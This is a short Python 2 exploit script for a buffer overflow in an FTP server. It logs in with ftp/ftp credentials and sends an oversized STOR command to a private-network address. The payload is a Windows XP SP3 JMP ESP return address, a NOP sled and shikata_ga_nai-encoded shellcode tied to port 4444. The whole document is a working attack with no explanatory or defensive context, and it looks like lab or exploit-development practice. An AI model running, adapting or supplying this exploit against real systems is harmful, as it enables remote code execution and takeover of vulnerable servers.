#!/usr/bin/python

import socket

#7e429353 jmp esp user32.dll xp sp3 eng
ret ="\x53\x93\x42\x7e"		

# * Encoder: x86/shikata_ga_nai LPORT=4444, 
shellcode=("\xdb\xcb\xd9\x74\x24\xf4\x5e\x2b\xc9\xbf\x6c\x05\xc6\x0b\xb1"
"\x56\x31\x7e\x18\x83\xee\xfc\x03\x7e\x78\xe7\x33\xf7\x68\x6e"
"\xbb\x08\x68\x11\x35\xed\x59\x03\x21\x65\xcb\x93\x21\x2b\xe7"
"\x58\x67\xd8\x7c\x2c\xa0\xef\x35\x9b\x96\xde\xc6\x2d\x17\x8c"
"\x04\x2f\xeb\xcf\x58\x8f\xd2\x1f\xad\xce\x13\x7d\x5d\x82\xcc"
"\x09\xcf\x33\x78\x4f\xd3\x32\xae\xdb\x6b\x4d\xcb\x1c\x1f\xe7"
"\xd2\x4c\x8f\x7c\x9c\x74\xa4\xdb\x3d\x84\x69\x38\x01\xcf\x06"
"\x8b\xf1\xce\xce\xc5\xfa\xe0\x2e\x89\xc4\xcc\xa3\xd3\x01\xea"
"\x5b\xa6\x79\x08\xe6\xb1\xb9\x72\x3c\x37\x5c\xd4\xb7\xef\x84"
"\xe4\x14\x69\x4e\xea\xd1\xfd\x08\xef\xe4\xd2\x22\x0b\x6d\xd5"
"\xe4\x9d\x35\xf2\x20\xc5\xee\x9b\x71\xa3\x41\xa3\x62\x0b\x3e"
"\x01\xe8\xbe\x2b\x33\xb3\xd6\x98\x0e\x4c\x27\xb6\x19\x3f\x15"
"\x19\xb2\xd7\x15\xd2\x1c\x2f\x59\xc9\xd9\xbf\xa4\xf1\x19\xe9"
"\x62\xa5\x49\x81\x43\xc5\x01\x51\x6b\x10\x85\x01\xc3\xca\x66"
"\xf2\xa3\xba\x0e\x18\x2c\xe5\x2f\x23\xe6\x90\x77\xed\xd2\xf1"
"\x1f\x0c\xe5\xe4\x83\x99\x03\x6c\x2c\xcc\x9c\x18\x8e\x2b\x15"
"\xbf\xf1\x19\x09\x68\x66\x15\x47\xae\x89\xa6\x4d\x9d\x26\x0e"
"\x06\x55\x25\x8b\x37\x6a\x60\xbb\x3e\x53\xe3\x31\x2f\x16\x95"
"\x46\x7a\xc0\x36\xd4\xe1\x10\x30\xc5\xbd\x47\x15\x3b\xb4\x0d"
"\x8b\x62\x6e\x33\x56\xf2\x49\xf7\x8d\xc7\x54\xf6\x40\x73\x73"
"\xe8\x9c\x7c\x3f\x5c\x71\x2b\xe9\x0a\x37\x85\x5b\xe4\xe1\x7a"
"\x32\x60\x77\xb1\x85\xf6\x78\x9c\x73\x16\xc8\x49\xc2\x29\xe5"
"\x1d\xc2\x52\x1b\xbe\x2d\x89\x9f\xc0\xdc\x03\x0a\x54\x47\xf6"
"\x77\x38\x78\x2d\xbb\x45\xfb\xc7\x44\xb2\xe3\xa2\x41\xfe\xa3"
"\x5f\x38\x6f\x46\x5f\xef\x90\x43")

buffer='\x41' * 964 + ret + '\x43' * 16 + '\x90' * 16 + shellcode + '\xCC' * 659

print "Buffer inviato"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.254.131',21))
data=s.recv(1024)

s.send('USER ftp\r\n')
data=s.recv(1024)

s.send('PASS ftp\r\n')
data=s.recv(1024)

s.send('STOR '+buffer+'\r\n')
s.close

